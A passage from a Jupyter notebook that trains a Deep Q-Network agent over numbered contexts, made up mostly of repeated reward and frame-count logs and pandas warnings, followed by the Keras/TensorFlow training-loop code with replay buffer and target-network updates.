      "Running reward: 11.00\t Episode 92\t Frame count: 146400\t Context: 1\n",
      "Running reward: 11.00\t Episode 92\t Frame count: 146500\t Context: 1\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 146600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 93\t Frame count: 146700\t Context: 1\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 146800\t Context: 1\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 146900\t Context: 2\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 147000\t Context: 2\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 147100\t Context: 2\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 147200\t Context: 1\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 147300\t Context: 2\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 147400\t Context: 2\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 147500\t Context: 2\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 147600\t Context: 2\n",
      "Running reward: 11.00\t Episode 95\t Frame count: 147700\t Context: 1\n",
      "Running reward: 11.00\t Episode 95\t Frame count: 147800\t Context: 1\n",
      "Running reward: 11.00\t Episode 95\t Frame count: 147900\t Context: 1\n",
      "Running reward: 11.00\t Episode 95\t Frame count: 148000\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 148100\t Context: 1\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 148200\t Context: 1\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 148300\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 148400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 97\t Frame count: 148500\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 148600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 97\t Frame count: 148700\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 148800\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 148900\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 149000\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 149100\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 149200\t Context: 2\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 149300\t Context: 2\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 149400\t Context: 2\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 149500\t Context: 2\n",
      "Running reward: 11.00\t Episode 98\t Frame count: 149600\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 149700\t Context: 1\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 149800\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 149900\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 99\t Frame count: 150100\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150200\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150300\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150400\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150500\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150600\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150700\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150800\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 150900\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151000\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151100\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151200\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151300\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151400\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151500\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151600\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151700\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151800\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 151900\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152000\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152100\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152200\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152300\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152400\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152500\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152600\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152700\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152800\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 152900\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153000\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153100\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153200\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153300\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153400\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153500\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153600\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 153700\t Context: 2\n",
      "Running reward: 11.00\t Episode 100\t Frame count: 153800\t Context: 1\n",
      "Running reward: 11.00\t Episode 100\t Frame count: 153900\t Context: 1\n",
      "Running reward: 11.00\t Episode 100\t Frame count: 154000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 100\t Frame count: 154100\t Context: 1\n",
      "Running reward: 11.00\t Episode 100\t Frame count: 154200\t Context: 2\n",
      "Running reward: 11.00\t Episode 100\t Frame count: 154300\t Context: 2\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 154400\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 154500\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 154600\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 154700\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 154800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 101\t Frame count: 154900\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 155000\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 155100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 101\t Frame count: 155200\t Context: 2\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 155300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 102\t Frame count: 155400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 102\t Frame count: 155500\t Context: 1\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 155600\t Context: 2\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 155700\t Context: 2\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 155800\t Context: 2\n",
      "Running reward: 11.00\t Episode 104\t Frame count: 155900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 105\t Frame count: 156000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 106\t Frame count: 156100\t Context: 1\n",
      "Running reward: 11.00\t Episode 106\t Frame count: 156200\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 156300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 107\t Frame count: 156400\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 156500\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 156600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 107\t Frame count: 156700\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 156800\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 156900\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157000\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157100\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157200\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157300\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157400\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157500\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157600\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157700\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157800\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 157900\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158000\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158100\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158200\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158300\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158400\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158500\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158600\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158700\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158800\t Context: 2\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 158900\t Context: 2\n",
      "Running reward: 11.00\t Episode 108\t Frame count: 159000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 108\t Frame count: 159100\t Context: 1\n",
      "Running reward: 11.00\t Episode 108\t Frame count: 159200\t Context: 1\n",
      "Running reward: 11.00\t Episode 108\t Frame count: 159300\t Context: 2\n",
      "Running reward: 11.00\t Episode 108\t Frame count: 159400\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 159500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 109\t Frame count: 159600\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 159700\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 159800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 109\t Frame count: 159900\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160000\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160100\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160200\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160300\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160400\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160500\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160600\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160700\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160800\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 160900\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161000\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 109\t Frame count: 161200\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161300\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161400\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 109\t Frame count: 161600\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161700\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161800\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 161900\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162000\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162100\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162200\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162300\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162400\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162500\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162600\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162700\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162800\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 162900\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163000\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163100\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163200\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163300\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163400\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163500\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163600\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163700\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163800\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 163900\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164000\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164100\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164200\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164300\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164400\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164500\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164600\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164700\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 164800\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 164900\t Context: 1\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 165000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 110\t Frame count: 165100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 110\t Frame count: 165200\t Context: 1\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 165300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 110\t Frame count: 165400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 110\t Frame count: 165500\t Context: 1\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 165600\t Context: 1\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 165700\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 165800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 110\t Frame count: 165900\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 166000\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 166100\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 166200\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 166300\t Context: 2\n",
      "DQN terminated at episode 110 with a running reward of 11.0!\n"
     ]
    }
   ],
   "source": [
    "# In the Deepmind paper they use RMSProp however then Adam optimizer\n",
    "# improves training time\n",
    "optimizer = keras.optimizers.Adam(learning_rate=learning_rate, clipnorm=1.0)\n",
    "\n",
    "# Experience replay buffers\n",
    "action_history = []\n",
    "state_history = []\n",
    "state_next_history = []\n",
    "rewards_history = []\n",
    "done_history = []\n",
    "episode_reward_history = []\n",
    "running_reward = 0\n",
    "episode_count = 0\n",
    "frame_count = 0\n",
    "# Number of frames to take random action and observe output\n",
    "epsilon_random_frames = 500\n",
    "# Number of frames for exploration\n",
    "epsilon_greedy_frames = 1000.0\n",
    "# Maximum replay length\n",
    "# Note: The Deepmind paper suggests 1000000 however this causes memory issues\n",
    "max_memory_length = 10000\n",
    "# Train the model after 4 actions\n",
    "update_after_actions = 4\n",
    "# How often to update the target network\n",
    "update_target_network = 100\n",
    "# Using huber loss for stability\n",
    "loss_function = keras.losses.Huber()\n",
    "\n",
    "analytics = DQNAnalytics()\n",
    "\n",
    "while True:  # Run until solved\n",
    "    state = create_empty_state()\n",
    "    episode_reward = 0\n",
    "    reset_context()\n",
    "    context_actions = 0\n",
    "    epsilon = starting_epsilon\n",
    "\n",
    "    analytics.begin_episode()\n",
    "    for timestep in range(1, max_steps_per_episode):\n",
    "        # env.render(); Adding this line would show the attempts\n",
    "        # of the agent in a pop up window.\n",
    "        frame_count += 1\n",
    "\n",
    "        # Use epsilon-greedy for exploration\n",
    "        if frame_count < epsilon_random_frames or epsilon > np.random.rand(1)[0]:\n",
    "            # Take random action\n",
    "            action = np.random.choice(num_actions)\n",
    "        else:\n",
    "            # Predict action Q-values\n",
    "            # From environment state\n",
    "            action_probs = model(state.reshape(1, features, 1), training=False)\n",
    "            # Take best action\n",
    "            action = tf.argmax(action_probs[0]).numpy()\n",
    "\n",
    "        # Decay probability of taking random action\n",
    "        epsilon -= epsilon_interval / epsilon_greedy_frames\n",
    "        epsilon = max(epsilon, epsilon_min)\n",
    "\n",
    "        # Apply the sampled action in our environment\n",
    "        state_next, reward, done = perform_action(action)\n",
    "        analytics.add_attempt()\n",
    "        state_next = state_next\n",
    "\n",
    "        episode_reward += reward\n",
    "\n",
    "        # If the reward is positive, a context has been solved.\n",
    "        # Keep track of this.\n",
    "        if reward > 0:\n",
    "            analytics.record_success(action)\n",
    "\n",
    "        # Save actions and states in replay buffer\n",
    "        action_history.append(action)\n",
    "        state_history.append(state)\n",
    "        state_next_history.append(state_next)\n",
    "        done_history.append(done)\n",
    "        rewards_history.append(reward)\n",
    "        state = state_next\n",
    "\n",
    "        # Update every fourth frame and once batch size is over 32\n",
    "        if frame_count % update_after_actions == 0 and len(done_history) > batch_size:\n",
    "\n",
    "            # Get indices of samples for replay buffers\n",
    "            indices = np.random.choice(range(len(done_history)), size=batch_size)\n",
    "            #print(state_history[-2:-1])\n",
    "\n",
    "            # Using list comprehension to sample from replay buffer\n",
    "            state_sample = np.array([state_history[i] for i in indices]).reshape(batch_size, features, 1)\n",
    "            state_next_sample = np.array([state_next_history[i] for i in indices]).reshape(batch_size, features, 1)\n",
    "            rewards_sample = [rewards_history[i] for i in indices]\n",
    "            action_sample = [action_history[i] for i in indices]\n",
    "            done_sample = tf.convert_to_tensor(\n",
    "                [float(done_history[i]) for i in indices]\n",
    "            )\n",
    "\n",
    "            # Build the updated Q-values for the sampled future states\n",
    "            # Use the target model for stability\n",
    "            future_rewards = model_target.predict(state_next_sample, batch_size=batch_size, verbose=0)\n",
    "            # Q value = reward + discount factor * expected future reward\n",
    "            updated_q_values = rewards_sample + gamma * tf.reduce_max(\n",
    "                future_rewards, axis=1\n",
    "            )\n",
    "\n",
    "            # If final frame set the last value to -1\n",
    "            updated_q_values = updated_q_values * (1 - done_sample) - done_sample\n",
    "\n",
    "            # Create a mask so we only calculate loss on the updated Q-values\n",
    "            masks = tf.one_hot(action_sample, num_actions)\n",
    "\n",
    "            with tf.GradientTape() as tape:\n",
    "                # Train the model on the states and updated Q-values\n",
    "                q_values = model(state_sample)\n",
    "\n",
    "                # Apply the masks to the Q-values to get the Q-value for action taken\n",
    "                q_action = tf.reduce_sum(tf.multiply(q_values, masks), axis=1)\n",
    "                # Calculate loss between new Q-value and old Q-value\n",
    "                loss = loss_function(updated_q_values, q_action)\n",
    "\n",
    "            # Backpropagation\n",
    "            grads = tape.gradient(loss, model.trainable_variables)\n",
    "            optimizer.apply_gradients(zip(grads, model.trainable_variables))\n",
    "\n",
    "        if frame_count % update_target_network == 0:\n",
    "            # update the the target network with new weights\n",
    "            model_target.set_weights(model.get_weights())\n",
    "            # Log details\n",
    "            template = 'Running reward: {:.2f}\\t Episode {}\\t Frame count: {}\\t Context: {}'\n",
    "            print(template.format(running_reward, episode_count + 1, frame_count, context_index + 1))\n",
    "\n",
    "        # Limit the state and reward history\n",
    "        if len(rewards_history) > max_memory_length:\n",
    "            del rewards_history[:1]\n",
    "            del state_history[:1]\n",
    "            del state_next_history[:1]\n",
    "            del action_history[:1]\n",
    "            del done_history[:1]\n",
    "\n",
    "        if done:\n",
    "            break\n",
    "\n",
    "    # Update running reward to check condition for solving\n",
    "    episode_reward_history.append(episode_reward)\n",
    "    if len(episode_reward_history) > 100:\n",
    "        del episode_reward_history[:1]\n",
    "    running_reward = np.mean(episode_reward_history)\n",
    "\n",
    "    episode_count += 1\n",
    "\n",
    "    if episode_count >= training_episodes + test_episodes:\n",
    "        print(f'DQN terminated at episode {episode_count} with a running reward of {running_reward}!')\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
